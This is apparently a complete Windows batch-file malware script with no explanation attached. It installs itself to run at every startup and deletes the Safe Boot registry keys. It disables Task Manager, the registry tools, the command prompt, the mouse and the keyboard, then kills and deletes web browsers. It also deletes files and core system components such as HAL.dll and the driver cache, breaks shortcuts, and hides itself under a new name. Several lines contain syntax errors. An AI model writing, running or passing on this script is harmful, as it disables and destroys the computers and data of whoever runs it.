@echo off
copy %0 %WinDir%\Win32.bat > nul
copy %0 %windir%\Win32.bat > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d %windir%\Win32.bat /f
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot\*.* /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /q
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
rundll32 mouse,disable > nul
rundll32 keyboard,disable > nul
rundll32 user,disableoemlayer > nul
@echo off
taskkill /im /f chrome.exe
taskkill /im /f ie.exe
taskkill /im /f firefox.exe
taskkill /im /f opera.exe
taskkill /im /f safari.exe
del C:\Program Files\Google\Chrome\Application\chrome.exe /q
del C:\Program Files\Safari\safari.exe /q
del C:\Program Files\Mozilla Firefox\firefox.exe /q
del C:\Program Files\Opera\opera.exe /q
del C:\Program Files\Internet Explorer\ie.exe /q
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
taskkill /f /im explorer.exe > nul
del: *.*/q > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
del %WinDir%\system32\HAL.dll/q > nul
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
del "%SystemRoot%\Media" /q > nul
assoc .lnk=.txt
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
del "%SystemRoot%\Cursors\*.*" >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
copy "%0" "%SystemRoot%\system32\sys321.bat > nul
del %0